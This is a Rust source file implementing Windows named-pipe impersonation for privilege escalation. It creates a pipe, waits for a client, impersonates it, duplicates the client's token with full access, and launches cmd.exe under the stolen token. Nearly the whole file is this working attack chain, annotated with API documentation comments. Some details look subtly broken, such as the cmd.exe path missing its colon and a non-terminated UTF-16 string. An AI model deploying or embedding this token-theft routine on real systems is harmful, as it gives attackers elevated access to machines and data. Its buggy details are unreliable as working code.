use std::mem::size_of;

use ntapi::winapi::um::handleapi::CloseHandle;
use windows_sys::Win32::{
    Security::{DuplicateTokenEx, SecurityImpersonation, TokenPrimary, TOKEN_ALL_ACCESS},
    Storage::FileSystem::{ReadFile, PIPE_ACCESS_DUPLEX},
    System::{
        Pipes::{
            ConnectNamedPipe, CreateNamedPipeW, DisconnectNamedPipe, ImpersonateNamedPipeClient,
            PIPE_TYPE_MESSAGE, CreateNamedPipeA, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES,
        },
        Threading::{
            CreateProcessWithTokenW, GetCurrentThread, OpenThreadToken, CREATE_NEW_CONSOLE,
            LOGON_WITH_PROFILE, PROCESS_INFORMATION, STARTUPINFOW,
        },
    },
};

use super::{error::Error, get_last_error};

pub fn impersonate_named_pipe() -> Result<(), Error> {
    log::info!("Creating named pipe");

    //let pipe_name_w = pipe_name.encode_utf16().collect::<Vec<u16>>();
    //log::info!("pipe_name_w: {:?}", pipe_name_w.as_st);
    let pipe_name_w = "\\\\.\\pipe\\test\0".as_ptr() as *const u8;

    // Creates an instance of a named pipe and returns a handle for subsequent pipe operations.
    // A named pipe server process uses this function either to create the first instance of
    // a specific named pipe and establish its basic attributesor to create a new instance of an existing named pipe.
    // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createnamedpipew
    let pipe_handle = unsafe {
        CreateNamedPipeA(
            pipe_name_w,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE, //PIPE_WAIT
            PIPE_UNLIMITED_INSTANCES,
            2048,
            2048,
            0,
            std::ptr::null_mut(),
        )
    };

    if pipe_handle == 0 {
        return Err(Error::FailedToCreateNamedPipe(get_last_error()));
    }
    log::info!("Creating named pipe created!");
    log::info!("Connecting to named pipe");

    //
    // Note this will wait until something connects to it.
    //

    // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe.
    // A client process connects by calling either the CreateFile or CallNamedPipe function.
    // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe
    let connect_named_pip_result = unsafe { ConnectNamedPipe(pipe_handle, std::ptr::null_mut()) };

    if connect_named_pip_result == 0 {
        //Disconnects the server end of a named pipe instance from a client process.
        // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-disconnectnamedpipe
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::FailedToConnectNamedPipe(get_last_error()));
    }

    log::info!("Connecting to named pipe successfully!");
    log::info!("reading data from named pipe");

    let mut buffer: [u8; 1] = [0];
    let mut read: u32 = 0;
    // Reads data from the specified file or input/output (I/O) device.
    // Reads occur at the position specified by the file pointer if supported by the device.
    // This function is designed for both synchronous and asynchronous operations.
    // For a similar function designed solely for asynchronous operation, see ReadFileEx.
    // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
    let read_file_result = unsafe {
        ReadFile(
            pipe_handle,
            buffer.as_mut_ptr() as *mut _,
            1,
            &mut read,
            std::ptr::null_mut(),
        )
    };

    if read_file_result == 0 {
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::FailedToReadFromNamedPipe(get_last_error()));
    }
    log::info!("data read from pipe successfully!");
    log::info!("impersonating named pipe client");

    // The ImpersonateNamedPipeClient function impersonates a named-pipe client application.
    // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
    let impersonate_named_pip_client_res = unsafe { ImpersonateNamedPipeClient(pipe_handle) };

    if impersonate_named_pip_client_res == 0 {
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::ImpersonateNamedPipeClient(get_last_error()));
    }

    log::info!("impersonating named pipe client successful!");
    log::info!("getting current thread and opening thread token");

    // Retrieves a pseudo handle for the calling thread.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread
    let thread_handle = unsafe { GetCurrentThread() };

    let mut thread_token = 0;
    // The OpenThreadToken function opens the access token associated with a thread.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken
    let open_thread_token_result =
        unsafe { OpenThreadToken(thread_handle, TOKEN_ALL_ACCESS, 0, &mut thread_token) };

    if open_thread_token_result == 0 {
        unsafe { CloseHandle(thread_handle as _) };
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::FailedToOpenThreadToken(get_last_error()));
    }

    log::info!("getting current thread and opening thread token successful!");

    log::info!("duplicating token");

    let mut duplicate_token_handle = 0;
    // The DuplicateTokenEx function creates a new access token that duplicates an existing token.
    // This function can create either a primary token or an impersonation token.
    // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
    let duplicate_token_result = unsafe {
        DuplicateTokenEx(
            thread_token,
            TOKEN_ALL_ACCESS,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicate_token_handle,
        )
    };

    unsafe { CloseHandle(thread_handle as _) };
    unsafe { CloseHandle(thread_token as _) };
    unsafe { DisconnectNamedPipe(pipe_handle) };

    if duplicate_token_result == 0 {
        return Err(Error::FailedToDuplicateThreadToken(get_last_error()));
    }

    log::info!("duplicating token successful!");
    log::info!("creating process with token");

    let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
    startup_info.cb = size_of::<STARTUPINFOW>() as u32;
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let create_process_with_token_w_result = unsafe {
        CreateProcessWithTokenW(
            duplicate_token_handle,
            LOGON_WITH_PROFILE,
            std::ptr::null_mut(),
            "C\\Windows\\System32\\cmd.exe"
                .encode_utf16()
                .collect::<Vec<u16>>()
                .as_mut_ptr(),
            CREATE_NEW_CONSOLE,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };

    if create_process_with_token_w_result == 0 {
        unsafe { CloseHandle(duplicate_token_handle as _) };
        return Err(Error::FailedToCreateProcessWithTokenW(get_last_error()));
    }

    unsafe { CloseHandle(duplicate_token_handle as _) };

    log::info!("creating process with token sucessful!");

    Ok(())
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}